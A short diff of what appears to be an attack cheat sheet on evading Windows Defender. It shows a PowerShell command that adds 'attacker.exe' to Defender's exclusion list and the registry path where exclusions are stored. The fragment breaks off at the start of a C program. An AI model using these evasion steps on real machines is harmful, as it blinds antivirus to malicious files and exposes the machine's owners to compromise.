@@ -12,7 +12,22 @@ Add-MpPreference -ExclusionPath "C:\$env:USERPROFILE\Documents\attacker.exe" # e
 
 
 ### Add path/executable file via Regedit
-#### Run program as administrative user
+```cmd
+:: Path in regedit
+:: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+
+
+
+
+```
+
+
+
+
+
+
+
+
 ```c
 int main(void)
 {
